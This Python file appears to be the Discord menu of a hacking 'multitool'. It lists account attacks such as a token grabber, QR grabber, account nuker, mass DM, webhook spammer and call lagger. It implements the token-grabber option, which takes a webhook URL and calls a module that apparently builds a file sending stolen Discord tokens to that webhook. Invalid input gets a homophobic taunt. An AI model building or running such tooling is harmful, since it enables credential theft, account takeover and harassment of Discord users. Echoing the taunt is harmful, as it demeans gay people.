import sys,os
import colorama
import ctypes
import multiprocessing
import os.path
import base64
import keyboard
from os import system
from colorama import init, Fore, Back, Style

from plugins.update import search_for_updates
from plugins.standard import *
import scripts.token

system ("cls")
system("title " + "F1BER MULTITOOL (DISCORD TOOLS)")

init(convert=True)

print(Fore.RED +      '                                    :::::::::: :::   :::::::::  :::::::::: :::::::::')
print(Fore.RED +     '                                    :+:      :+:+:   :+:    :+: :+:        :+:    :+:')
print(Fore.RED +    '                                    +:+        +:+   +:+    +:+ +:+        +:+    +:+')
print(Fore.RED +   '                                    :#::+::#   +#+   +#++:++#+  +#++:++#   +#++:++#:')
print(Fore.RED +  '                                    +#+        +#+   +#+    +#+ +#+        +#+    +#+')
print(Fore.RED + '                                    #+#        #+#   #+#    #+# #+#        #+#    #+#  ')  
print(Fore.RED + '                                    ###      ####### #########  ########## ###    ### ')  
print("")                                                             
print(f"{Fore.MAGENTA}                                             Developer: F1ber" + Fore.LIGHTMAGENTA_EX+ "   Version 0.1")
print(f"{Fore.RED}                                        U have now opened the DISCORD TOOLS TAB")
print("")

print(Fore.LIGHTRED_EX+"♦0♦" + Fore.WHITE+"  »" + Fore.BLUE+" Token Grabber")
print(Fore.LIGHTRED_EX+"♦1♦" + Fore.WHITE+"  »" + Fore.BLUE+" QR Grabber")
print(Fore.LIGHTRED_EX+"♦2♦" + Fore.WHITE+"  »" + Fore.BLUE+" Token Checker")
print(Fore.LIGHTRED_EX+"♦3♦" + Fore.WHITE+"  »" + Fore.BLUE+" Token Information")
print(Fore.LIGHTRED_EX+"♦4♦" + Fore.WHITE+"  »" + Fore.BLUE+" Nuke Account")
print(Fore.LIGHTRED_EX+"♦5♦" + Fore.WHITE+"  »" + Fore.BLUE+" Status Changer")
print(Fore.LIGHTRED_EX+"♦6♦" + Fore.WHITE+"  »" + Fore.BLUE+" House Changer")
print(Fore.LIGHTRED_EX+"♦7♦" + Fore.WHITE+"  »" + Fore.BLUE+" Clear DMs")
print(Fore.LIGHTRED_EX+"♦8♦" + Fore.WHITE+"  »" + Fore.BLUE+" Mass DM")
print(Fore.LIGHTRED_EX+"♦9♦" + Fore.WHITE+"  »" + Fore.BLUE+" Webhook Spammer")
print(Fore.LIGHTRED_EX+"♦10♦" + Fore.WHITE+" »" + Fore.BLUE+" VoiceCall Lagger")
print(Fore.LIGHTRED_EX+"♦11♦" + Fore.WHITE+" »" + Fore.BLUE+" Block Bypass")
print(Fore.LIGHTRED_EX+"♦12♦" + Fore.WHITE+" »" + Fore.BLUE+" random bullshit")
print(Fore.LIGHTRED_EX+"♦13♦" + Fore.WHITE+" »" + Fore.BLUE+" Videocrash Maker")
print(Fore.LIGHTRED_EX+"♦14♦" + Fore.WHITE+" »" + Fore.BLUE+" Disable Account")
print(Fore.LIGHTRED_EX+"♦15♦" + Fore.WHITE+" »" + Fore.BLUE+" Login to profile")
print("")
print(Fore.LIGHTRED_EX+"BACK" + Fore.WHITE+" »" + Fore.WHITE+" BACK TO MAIN PAGE" + Fore.WHITE+"")
f1bernumber = input("> ")

if f1bernumber == "back":
    os.system('cmd /k "python f1ber.py"')
elif f1bernumber == "BACK":
    os.system('cmd /k "python f1ber.py"')

elif f1bernumber == '0':
        WebHook = input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}»»{Fore.LIGHTRED_EX}] {Fore.RESET}Enter Valid Webhook Url: {Fore.RED}')
        validateWebhook(WebHook)
        fileName = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}»»{Fore.LIGHTRED_EX}] {Fore.RESET}Enter File name: {Fore.RED}'))
        scripts.token.f1bergrabber(WebHook, fileName)

else:
  print(f'\n\nMmmhh you seem kinda {Fore.RED}g{Fore.YELLOW}a{Fore.GREEN}y{Fore.WHITE}\nWhat if you tried typing a {Fore.GREEN}VALID {Fore.WHITE}number?')
  sleep(5)
  os.system('cmd /k "python util/f1ber/discordtools.py"')